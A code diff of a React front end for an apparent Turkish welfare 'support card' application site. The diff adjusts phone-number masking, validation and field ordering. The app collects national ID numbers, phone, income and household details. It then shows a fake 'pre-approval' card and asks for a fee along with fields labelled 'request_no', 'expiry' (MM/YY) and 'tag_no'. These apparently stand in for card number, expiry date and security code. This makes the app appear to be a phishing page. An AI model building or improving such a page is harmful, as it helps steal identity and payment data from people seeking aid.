@@ -7,12 +7,25 @@ const iconMap={users:Users,graduation:GraduationCap,heart:HeartHandshake,store:S
 const blankForm={name:'',surname:'',tc_no:'',birth:'',city:'',district:'',phone:'',profession:'',income:'',household:'',consent:false}
 const blankRequest={full_name:'',request_no:'',expiry:'',tag_no:''}
 const deepMerge=(base,extra)=>{if(Array.isArray(base))return Array.isArray(extra)?extra:base;if(base&&typeof base==='object'){const out={...base};Object.keys(extra||{}).forEach(k=>{out[k]=k in base?deepMerge(base[k],extra[k]):extra[k]});return out}return extra??base}
-const hydrateSettings=(data)=>{const n=deepMerge(defaultSettings,data||{});if(data?.preform?.fields){const fields={...data.preform.fields};if(fields.email){if(!fields.profession)fields.profession={...defaultSettings.preform.fields.profession};delete fields.email}n.preform.fields=fields}return n}
+const hydrateSettings=(data)=>{const n=deepMerge(defaultSettings,data||{});if(data?.preform?.fields){const fields={...data.preform.fields};if(fields.email){if(!fields.profession)fields.profession={...defaultSettings.preform.fields.profession};delete fields.email}Object.keys(fields).forEach(k=>{if(fields[k]?.order==null&&defaultSettings.preform.fields[k]?.order!=null)fields[k]={...fields[k],order:defaultSettings.preform.fields[k].order}});n.preform.fields=fields}return n}
 const randomCard=()=>Array.from({length:16},()=>Math.floor(Math.random()*10)).join('').replace(/(\d{4})(?=\d)/g,'$1 ')
 const onlyDigits=(v,n)=>v.replace(/\D/g,'').slice(0,n)
 const expiryMask=v=>{const d=v.replace(/\D/g,'').slice(0,4);return d.length>2?d.slice(0,2)+'/'+d.slice(2):d}
-function phoneMask(v){let d=v.replace(/\D/g,'');if(d.startsWith('90'))d=d.slice(2);if(d.startsWith('0'))d=d.slice(1);d=d.slice(0,10);if(!d)return '';let o='+90';if(d.length)o+=' ('+d.slice(0,3);if(d.length>=3)o+=')';if(d.length>3)o+=' '+d.slice(3,6);if(d.length>6)o+=' '+d.slice(6,8);if(d.length>8)o+=' '+d.slice(8,10);return o}
-const validPhone=v=>v.replace(/\D/g,'').replace(/^90/,'').length===10
+function phoneMask(v){
+ let d=String(v||'').replace(/\D/g,'');
+ if(d.startsWith('90'))d=d.slice(2);
+ if(d.startsWith('0'))d=d.slice(1);
+ d=d.slice(0,10);
+ if(!d)return '';
+ let o='0';
+ if(d.length)o+=' ('+d.slice(0,3);
+ if(d.length>=3)o+=')';
+ if(d.length>3)o+=' '+d.slice(3,6);
+ if(d.length>6)o+=' '+d.slice(6,8);
+ if(d.length>8)o+=' '+d.slice(8,10);
+ return o
+}
+const validPhone=v=>{let d=String(v||'').replace(/\D/g,'');if(d.startsWith('90'))d=d.slice(2);if(d.startsWith('0'))d=d.slice(1);return /^5\d{9}$/.test(d)}
 const validTc=v=>/^\d{11}$/.test(String(v||''))&&String(v)[0]!=='0'
 
 export default function App(){
@@ -35,7 +48,7 @@ export default function App(){
    {step===0&&<>{banners.length>0&&<BannerCarousel banners={banners.slice(0,8)}/>}<section className="hero"><div><span className="eyebrow">{settings.home.eyebrow}</span><h1>{settings.home.hero_title}</h1><p>{settings.home.hero_text}</p><div className="notice"><Info size={20}/>{settings.home.notice_text}</div></div><aside><ShieldCheck size={38}/><b>{settings.home.side_title}</b><p>{settings.home.side_text}</p></aside></section><h2 className="section-title">{settings.home.programs_title}</h2><div className="program-grid">{programs.map(p=>{const Icon=iconMap[p.icon]||Users;return <button key={p.id} className="program-card" onClick={()=>{setProgram(p);setStep(1);scrollTo(0,0)}}><div className="icon-box"><Icon/></div><h3>{p.title}</h3><p>{p.description}</p><span>{settings.home.program_button} <ArrowRight size={16}/></span></button>})}</div></>}
    {step>0&&<Progress steps={settings.steps} current={step}/>} 
    {step===1&&<section className="panel"><div className="panel-head"><div><span className="eyebrow">{settings.preform.eyebrow}</span><h2>{program?.title}</h2></div></div><div className="notice"><Info size={18}/>{settings.preform.notice}</div><div className="form-grid">
-    {Object.entries(pf||{}).filter(([,cfg])=>cfg.visible).map(([k,cfg])=><DynamicField key={k} cfg={cfg} value={form[k]||''} onChange={v=>setForm(prev=>({...prev,[k]:normalizePreformValue(cfg,v)}))}/>)} 
+    {Object.entries(pf||{}).filter(([,cfg])=>cfg.visible).sort((a,b)=>(Number(a[1]?.order)||999)-(Number(b[1]?.order)||999)).map(([k,cfg])=><DynamicField key={k} cfg={cfg} value={form[k]||''} onChange={v=>setForm(prev=>({...prev,[k]:normalizePreformValue(cfg,v)}))}/>)} 
    </div><label className="consent"><input type="checkbox" checked={form.consent} onChange={e=>setForm({...form,consent:e.target.checked})}/><span>{settings.preform.consent}</span></label>{error&&<div className="error">{error}</div>}<div className="actions split"><button className="ghost back-btn" onClick={()=>{setStep(0);scrollTo(0,0)}}><ArrowLeft size={18}/>{settings.preform.back_button}</button><button className="primary" onClick={goPre}>{settings.preform.next_button}<ArrowRight size={18}/></button></div></section>}
    {step===2&&<section className="panel centered"><div className="ok"><CheckCircle2 size={42}/></div><span className="eyebrow">{settings.preapproval.eyebrow}</span><h2>{settings.preapproval.title}</h2><p className="muted">{settings.preapproval.text}</p><CardPreview cfg={settings.preapproval} programCfg={program} cardNo={cardNo} name={`${form.name} ${form.surname}`} program={program?.title}/><div className="actions split centered-actions"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.buttons.preapproval_back}</button><button className="primary" onClick={()=>{setRequest(r=>({...r,full_name:`${form.name} ${form.surname}`}));setStep(3);scrollTo(0,0)}}>{settings.buttons.preapproval_next}<ArrowRight size={18}/></button></div></section>}
    {step===3&&<section className="panel"><span className="eyebrow">{settings.request_page.eyebrow}</span><h2>{settings.request_page.title}</h2><div className="logo-slots">{settings.request_page.logo_urls.map((u,i)=><div key={i}>{u?<img src={u} alt={`Görsel ${i+1}`}/>:<span>Logo / Görsel {i+1}</span>}</div>)}</div>{settings.request_page.price_enabled&&<div className="price-box"><div><span>{settings.request_page.price_title}</span><b>{settings.request_page.price_value} {settings.request_page.price_currency}</b></div>{settings.request_page.price_subtitle&&<small>{settings.request_page.price_subtitle}</small>}</div>}<div className="form-grid one"><RequestField cfg={settings.request_form.full_name} value={request.full_name} onChange={v=>setRequest({...request,full_name:v})}/><RequestField cfg={settings.request_form.request_no} inputMode="numeric" value={request.request_no} onChange={v=>setRequest({...request,request_no:onlyDigits(v,Number(settings.request_form.request_no.length)||18)})}/><RequestField cfg={settings.request_form.expiry} inputMode="numeric" value={request.expiry} onChange={v=>setRequest({...request,expiry:expiryMask(v)})}/><RequestField cfg={settings.request_form.tag_no} inputMode="numeric" value={request.tag_no} onChange={v=>setRequest({...request,tag_no:onlyDigits(v,Number(settings.request_form.tag_no.length)||8)})}/></div>{error&&<div className="error">{error}</div>}<div className="actions split"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.buttons.request_back}</button><button className="primary" onClick={finish}>{settings.buttons.request_submit}<CheckCircle2 size={18}/></button></div></section>}
@@ -54,8 +67,16 @@ function BannerCarousel({banners}){
  </section>
 }
 function normalizePreformValue(cfg,v){if(cfg.type==='tc')return onlyDigits(v,11);if(cfg.type==='phone')return phoneMask(v);if(cfg.type==='number')return onlyDigits(v,Number(cfg.max_length)||12);return v}
-function DynamicField({cfg,value,onChange}){const type=cfg.type==='date'?'date':'text';const inputMode=cfg.type==='phone'?'tel':(['tc','number'].includes(cfg.type)?'numeric':undefined);const maxLength=cfg.type==='tc'?11:(cfg.max_length||undefined);return <Field cfg={cfg} value={value} onChange={onChange} type={type} inputMode={inputMode} maxLength={maxLength}/>}
-function Field({cfg,value,onChange,type='text',inputMode,maxLength}){return <label className="field"><span>{cfg.label}{cfg.required?' *':''}</span><input type={type} inputMode={inputMode} maxLength={maxLength} autoComplete="off" value={value} onChange={e=>onChange(e.target.value)} placeholder={cfg.placeholder}/></label>}
+function DynamicField({cfg,value,onChange}){
+ const type=cfg.type==='date'?'date':'text';
+ const inputMode=cfg.type==='phone'?'tel':(['tc','number'].includes(cfg.type)?'numeric':undefined);
+ const maxLength=cfg.type==='tc'?11:(cfg.type==='phone'?19:(cfg.max_length||undefined));
+ const autoComplete=cfg.type==='phone'?'tel':'off';
+ return <Field cfg={cfg} value={value} onChange={onChange} type={type} inputMode={inputMode} maxLength={maxLength} autoComplete={autoComplete}/>
+}
+function Field({cfg,value,onChange,type='text',inputMode,maxLength,autoComplete='off'}){
+ return <label className="field"><span>{cfg.label}{cfg.required?' *':''}</span><input type={type} inputMode={inputMode} maxLength={maxLength} autoComplete={autoComplete} value={value} onChange={e=>onChange(e.target.value)} placeholder={cfg.placeholder}/>{cfg.type==='phone'&&<small className="field-help">Örnek: 0 (5XX) XXX XX XX</small>}</label>
+}
 function RequestField({cfg,value,onChange,inputMode}){return <label className="field"><span>{cfg.label}{cfg.required?' *':''}</span><input inputMode={inputMode} autoComplete="off" value={value} onChange={e=>onChange(e.target.value)} placeholder={cfg.placeholder}/></label>}
 function Progress({steps,current}){return <div className="progress">{steps.map((s,i)=><div className={`progress-item ${i+1<=current?'active':''}`} key={i}><div>{i+1}</div><span>{s}</span></div>)}</div>}
 function CardPreview({cfg,programCfg,cardNo,name,program}){const bg=programCfg?.card_image_url||cfg.card_image_url;const color=programCfg?.card_text_color||cfg.card_text_color||'#fff';const style=bg?{backgroundImage:`linear-gradient(rgba(8,28,48,.18),rgba(8,28,48,.18)),url(${bg})`,color}:{color};return <div className="support-card" style={style}><div className="support-top"><div className="chip"/><span>{cfg.card_title}</span></div><div className="card-no">{cardNo}</div><div className="support-bottom"><div><small>{cfg.holder_label}</small><b>{(name||'ÖRNEK KULLANICI').toUpperCase()}</b></div><div><small>{cfg.program_label}</small><b>{(program||'Örnek Program').replace(' Destek Kartı','')}</b></div></div></div>}
